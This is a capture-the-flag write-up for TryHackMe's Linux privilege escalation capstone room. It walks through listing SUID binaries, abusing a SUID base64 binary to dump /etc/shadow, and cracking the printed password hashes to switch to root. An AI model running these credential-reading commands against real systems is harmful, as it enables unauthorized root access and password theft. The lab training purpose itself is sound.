## This is the write-up for the Capstone project of the [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc) room by [TryHackMe](https://tryhackme.com/).

### Questions to be answered:
1. What is the content of the flag1.txt file?
2. What is the content of the flag2.txt file?

### Approach:
Upon logging in to the system and playing around a bit, you will notice that the use is highly restricted.
In the `/home` directory, you will find three folders or users `leonard`, `missy`,`rootflags`

To solve the question, you need to go to the ```missy``` and ```rootflags``` directory. But changing directories is not permissible. You might notice that ```missy``` sounds
like a username, so there is a high chance that we could have an account by that username.

One way to check if that user account exists or not is by looking at the ```/etc/passwd``` file. This file holds user account information on a Linux system. 

**Command**
```
[leonard@ip-10-49-131-129 ~]$ cat /etc/passwd
```
**Output**
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
...
...
tcpdump:x:72:72::/:/sbin/nologin
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
missy:x:1001:1001::/home/missy:/bin/bash
```
As you can see, the `missy` user does exist. Also notice that we have `root` user as well. That mean we can also get the hashed password of both users from `/etc/shadow` file.

But if you do `cat /etc/shadow`, you will get a permission error.
`cat: /etc/shadow: Permission denied`

In the room, different tasks show different ways to exploit privilege escalation vulnerabilities. We will search the system for executable files with the SUID bit set.
Files that have SUID set can be executed with the permission level of the file owner or the group owner.

**Command**
```
[leonard@ip-10-48-177-176 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
```
**Output**
```
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
...
...
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
```

The `base64` executable has the SUID bit set, that mean we can execute the file with root level privilege. With that said, we can encode the `/etc/shadow` file and 
then decode it to read the content of the file.

**Command**
```
[leonard@ip-10-48-177-176 ~]$ base64 /etc/shadow | base64 --decode
```
**Output**
```
root:$6$DWBzMoiprTTJ4gb**********************************************D9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
...
...
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$*********************************************RVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

We got the hashed password of user `root` and `missy`. You can use `hashcat` or `john` or any online tool like [hashes.com](https://hashes.com/en/decrypt/hash) 
to crack the hash.

When got the password, you can change to a particular user by using command `su root` or `su missy`. 
Now you find the required files ```flag1.txt``` and ```flag2.txt``` using command 
```
find / -name flag1.txt 2>/dev/null
```
within those user directories.

____________________________________________________________________________________________________________________________________________________________________________

